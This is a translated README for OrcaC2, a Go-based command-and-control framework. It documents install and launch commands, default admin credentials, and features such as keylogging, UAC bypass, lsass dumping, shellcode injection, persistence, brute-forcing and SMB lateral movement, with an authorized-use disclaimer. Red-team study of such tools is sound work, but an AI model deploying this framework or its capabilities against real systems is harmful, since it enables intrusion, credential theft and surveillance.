Here’s the translation of the `OrcaC2` introduction and usage details to English:

---

## Introduction

`OrcaC2` is a multifunctional Command & Control (C&C) framework based on encrypted WebSocket communication, implemented in Golang.

It consists of three parts: `Orca_Server` (Server), `Orca_Master` (Control), and `Orca_Puppet` (Client).

<p align="center">
  <img src="https://camo.githubusercontent.com/901feedaecaae6c639aa78d381759233dbfa9ccad2f67545e3471b3e41903382/68747470733a2f2f692e696d6775722e636f6d2f4f584d484a71692e6a7067" width=400 height=400 alt="ST"/>
</p>
<p align="center">
    <img src="https://img.shields.io/github/license/Ptkatz/OrcaC2">
    <img src="https://img.shields.io/github/v/release/Ptkatz/OrcaC2?color=brightgreen">
    <img src="https://img.shields.io/github/go-mod/go-version/Ptkatz/OrcaC2?filename=Orca_Master%2Fgo.mod&color=6ad7e5">
</p>
<p align="center">
    <img src="https://img.shields.io/github/stars/Ptkatz/OrcaC2?style=social">
    🐳
    <img src="https://img.shields.io/github/forks/Ptkatz/OrcaC2?style=social">
</p>

## Features & Functions

- WebSocket communication with data transmitted in JSON format; messages and data are encrypted with AES-CBC and encoded with Base64
- Remote command control (includes a command memo feature for quickly selecting long commands)
- File upload/download
- Screenshot capture (for Windows clients)
- Remote screen control (based on screenshot stream, allowing keyboard and mouse control) (for Windows clients)
- Keylogging
- Query basic information of the client and host (can locate the geographical region of the external IP using a pure IP database)
- Process enumeration/termination
- Interactive terminal (for Linux clients)
- Hidden processes (the process name can appear as any process in the list when using the `ps` command, and can also delete its own program) (for Linux clients)
- Bypass UAC and obtain administrator privileges (for Windows clients)
- CLR memory loading of .NET assemblies (for Windows clients)
- Remote PowerShell module loading (for Windows clients)
- Remote Shellcode and PE loading (supported injection methods: CreateThread, CreateRemoteThread, RtlCreateUserThread, EtwpCreateEtwThread) (for Windows clients)
- Forward/reverse proxy, socks5 forward/reverse proxy (supported protocols: tcp, rudp (reliable udp), ricmp (reliable icmp), rhttp (reliable http), kcp, quic)
- Multi-threaded port scanning (fingerprinting port information)
- Multi-threaded port brute force (supports ftp, ssh, wmi, wmihash, smb, mssql, oracle, mysql, rdp, postgres, redis, memcached, mongodb, snmp)
- Remote SSH command execution/file upload/download/SSH tunneling
- Remote SMB command execution (no output)/file upload (commands executed via RPC service, similar to wmiexec; files uploaded via ipc$, similar to psexec)
- Extract Lsass.dmp using the MiniDumpWriteDump API (for Windows clients)
- Execute mimikatz, fscan via CreateProcessWithPipe (for Windows clients); execute fscan via memfd (for Linux clients)
- Persistence (scheduled tasks, registry startup items, services) (for Windows clients)
- Reverse meterpreter shell

## Installation

> Before compiling the source code, you need to install: Go (>=1.18), gcc 

### Compile on Windows

After downloading and extracting the source package, simply run the `install.bat` file.

### Compile on Linux

```bash
$ git clone https://github.com/Ptkatz/OrcaC2.git
$ cd OrcaC2
$ chmod +x install.sh
$ ./install.sh
```

> If `install.sh` fails, execute the commands in the script one by one.

## Usage

### Orca_Server

Run the server by double-clicking it, provided that the configuration file (`./conf/app.ini`) and database files (`./db/team.db`, `./qqwry.dat`) are present.

Parameters:

- `-c`:     Specify the path to the configuration file
- `-au`:    Add a user
- `-du`:    Delete a user
- `-mu`:    Modify a user’s password

### Orca_Puppet

```bash
Orca_Puppet.exe -host <Server IP:Port> -debug -hide
```

Parameters:

- `-host`:     Address to connect to the server, default is `127.0.0.1:6000`
- `-debug`:    Enable debug information, default is `false`
- `-hide`:     In Linux, can disguise the process name and delete its own program file

> The Puppet client can be generated on the Master side using the `generate/build` command.

### Orca_Master

```bash
Orca_Master.exe -u <username> -p <password> -H <Server IP:Port>
```

Parameters:

- `-u` | `--username`:     Username to connect to the server
- `-p` | `--password`:     Password to connect to the server
- `-H` | `--host`:    Address to connect to the server, default is `127.0.0.1:6000`
- `-c` | `--color`:    Color of the logo and command prompt

> The default username and password in the server database are `admin:123456`.

Connection successful example:

```bash
C:\Users\blood\Desktop\OrcaC2\out\master>Orca_Master_win_x64.exe -u admin -p 123456
OrcaC2 Master 0.10.9
https://github.com/Ptkatz/OrcaC2

[OrcaC2 Master startup ASCII art]

2022/11/04 19:29:53 [*] login success
Orca[admin] » help

OrcaC2 command line tool

Commands:
  clear            clear the screen
  exit             exit the shell
  generate, build  generate puppet
  help             use 'help [command]' for command help
  list, ls         list hosts
  port             use port scan or port brute
  powershell       manage powershell script
  proxy            activate the proxy function
  select           select the host id waiting to be operated
  ssh              connects to target host over the SSH protocol

Orca[admin] » list
+----+---------------+-----------------+------------------------------------------+-------+-----------+-------+
| ID |   HOSTNAME    |       IP        |                    OS                    | ARCH  | PRIVILEGE | PORT  |
+----+---------------+-----------------+------------------------------------------+-------+-----------+-------+
|  1 | PTKATZ/ptkatz | 10.10.10.10     | Microsoft Windows Server 2016 Datacenter | amd64 | user      | 49704 |
|  2 | kali/root     | 192.168.123.243 | Kali GNU/Linux Rolling                   | amd64 | root      | 35872 |
+----+---------------+-----------------+------------------------------------------+-------+-----------+-------+
Orca[admin] » select 1
Orca[admin] → 10.10.10.10 » help

OrcaC2 command line tool

OrcaC2 command line tool

Commands:
  assembly         manage the CLR and execute .NET assemblies
  back             back to the main menu
  clear            clear the screen
  close            close the selected remote client
  dump             extract the lsass.dmp
  exec             execute shellcode or pe in memory
  exit             exit the shell
  file             execute file upload or download
  generate, build  generate puppet
  getadmin         bypass uac to get system administrator privileges
  help             use 'help [command]' for command help
  info             get basic information of remote host
  keylogger        get information entered by the remote host through the keyboard
  list, ls         list hosts
  persist          permission maintenance
  plugin           load plugin (mimikatz｜fscan)
  port             use port scan or port brute
  powershell       manage powershell script
  process, ps      manage remote host processes
  proxy            activate the proxy function
  reverse          reverse shell
  screen           screenshot and screensteam
  select           select the host id waiting to be operated
  shell, sh        send command to remote host
  smb              lateral movement through the ipc$ pipe
  ssh              connects to target host over the SSH protocol

Orca[admin] → 10.10.10.10 »
```

## TODO

- [ ] Support WebSocket SSL
- [x] Dump Lsass
- [x] Load PowerShell modules
- [ ] Improve Linux-memfd execution without files
- [ ] MITM attack within the intranet
- [x] Screenshot for Linux systems
- [ ] Remote desktop based on VNC
- [ ] Set up tunnels with WireGuard for intranet access
- [ ] More support for MacOS systems


- [x] Generate loaders for the client based on payload
- [x] Implement remote loader in C to reduce client size
- [ ] Multi-port listeners
- [ ] GUI
- [ ] ...

## References

[List of reference GitHub projects and resources]

**Sincere thanks to the authors/teams of the above projects for their contributions and support to open source.**

## Known Bugs

- Errors may occur when using the `assembly invoke` feature with certain C# programs; always test first in a work environment.
- When connecting with the SMB command execution (`smb exec`), screenshot and screen control functions cannot be used.
- In Linux, using hidden execution (`-hide`) may cause the program to crash when invoking the `pty` feature.
- When running the Puppet client with the SSH feature, invoking the `pty` feature may cause the program to crash.

## Disclaimer

This tool is intended only for **legally authorized** corporate security construction activities. If you need to test this tool's usability, please set up a target environment yourself.

When using this tool for testing, ensure that the actions comply with local laws and regulations and that you have obtained sufficient authorization. **Do not scan unauthorized targets.**

If any illegal actions are taken using this tool, you are solely responsible for the consequences. I will not bear any legal or joint liability.

Before installing and using this tool, **please make sure to carefully read and fully understand each clause**. Limitations, disclaimers, or other terms involving your significant rights may be highlighted with bold, underlines, or other forms of emphasis. Unless you have fully read, completely understood, and accepted all the terms of this agreement, do not install or use this tool. Your use of the tool or any other express or implied acceptance of this agreement is considered as your agreement to be bound by this agreement.
